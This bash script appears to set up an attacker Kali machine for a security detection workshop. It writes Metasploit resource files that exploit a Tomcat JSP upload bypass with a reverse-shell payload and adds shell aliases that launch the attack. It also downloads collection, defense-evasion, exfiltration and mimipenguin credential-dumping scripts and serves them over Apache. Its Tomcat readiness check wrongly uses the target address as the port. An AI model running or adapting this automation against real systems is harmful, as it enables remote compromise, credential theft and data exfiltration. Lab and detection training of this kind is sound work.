#!/bin/bash
SCRIPT_DIR=$(cd $(dirname "$0") && pwd) # Absolute Path to Script's Directory
#myInvocation="$(printf %q "$BASH_SOURCE")$((($#)) && printf ' %q' "$@")"
SUFFIX='-kali';

startup ()
{
	clear;
	create_kali_macros;
	setup_aliases;
	install_packages;
	stage_apache;
	change_hostname;
	exit;
}

create_kali_macros ()
{
	# shellcheck disable=SC2024
	sudo cat >/home/kali/configure.rc <<'EOL'
use exploit/multi/http/tomcat_jsp_upload_bypass
set rhosts ${TARGET_ADDRESS}
set rport ${TARGET_PORT}
EOL
	
	sudo cat >/home/kali/startup.rc <<'EOL'
use exploit/multi/http/tomcat_jsp_upload_bypass
set rhosts ${TARGET_ADDRESS}
set rport ${TARGET_PORT}
set AutoRunScript post_exploit.rc
set payload java/jsp_shell_reverse_tcp
exploit -j
EOL

	sudo cat >/home/kali/post_exploit.rc <<'EOL'
whoami
netstat -ano
bash crowdstrike_test_high
EOL
	sudo chown kali:kali /home/kali/*.rc
}

setup_aliases ()
{
	sudo cat >>/home/kali/.zshrc <<'EOL'
function check_tomcat() {
	while true; do
	  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://${TARGET_ADDRESS}:${TARGET_ADDRESS}")
	  if [ "$STATUS" -eq "200" ]; then
		echo "Tomcat is now ready!";
		break
	  else
		echo "Tomcat not ready yet..."
	  fi
	  sleep 10
	done
}

function run_attack() {
	check_tomcat;
	echo "Running Metasploit";
	msfconsole -qx "use exploit/multi/http/tomcat_jsp_upload_bypass;\
	set RHOSTS ${TARGET_ADDRESS};\
	set RPORT ${TARGET_PORT};\
	exploit"
}

function run_attack_auto() {
	check_tomcat;
	echo "Running Metasploit";
	msfconsole -qr startup.rc;
}

PROMPT=$'%F{%(#.white.red)}${debian_chroot:+($debian_chroot)──}(%B%F{%(#.yellow.white)}%n@%m%b%F{%(#.white.red)})-[%B%F{reset}%(6~.%-1~/…/%4~.%5~)%b%F{%(#.white.red)}]%B%(#.%F{yellow}#.%F{white}$)%b%F{reset} '
EOL
	#sudo chown kali:kali /home/kali/.zshrc
}

install_packages ()
{
	touch ~/.hushlogin
	touch /home/kali/.hushlogin
	sudo apt-get -yqq update;
	sudo apt-get -yqq install jq net-tools;
}

stage_apache ()
{
	sudo service apache2 start;
	wget -q 'http://provisioning.aws.cs-labs.net/workshop/cwp/collection.sh' -O /var/www/html/collection.sh;
	wget -q 'http://provisioning.aws.cs-labs.net/workshop/cwp/defense_evasion.sh' -O /var/www/html/defense_evasion.sh;
	wget -q 'http://provisioning.aws.cs-labs.net/workshop/cwp/exfiltration.sh' -O /var/www/html/exfiltration.sh;
	wget -q 'http://provisioning.aws.cs-labs.net/workshop/cwp/mimipenguin.sh' -O /var/www/html/mimipenguin.sh;
}

change_hostname ()
{
	ENV_ID=$(cat /tmp/env.txt);
	ENV_HASH=$(curl -s "https://api.falcon.events/api/provisioning/hash?environment_id=$ENV_ID" | jq -r .resources.hash);
	sudo hostnamectl set-hostname "${ENV_HASH}${SUFFIX}";
}

if [ -z "$1" ]
then
    echo "You must specify an action."
    help
    exit 1
fi
if [[ "$1" == "up" || "$1" == "reload" ]]

then
    for arg in "$@"
    do
        if [[ "$arg" == *--target_address=* ]]
        then
            TARGET_ADDRESS=${arg/--target_address=/}
        fi
        if [[ "$arg" == *--target_port=* ]]
        then
            TARGET_PORT="${arg/--target_port=/}"
        fi
    done
fi



if [ -z "${TARGET_ADDRESS}" ]
then
    read -r -p "ALB DNS Address: " TARGET_ADDRESS
fi
if [ -z "${TARGET_PORT}" ]
then
    read -r -p "ALB Listening port: " TARGET_PORT
fi
echo "${TARGET_ADDRESS}"
echo "${TARGET_PORT}"


startup;
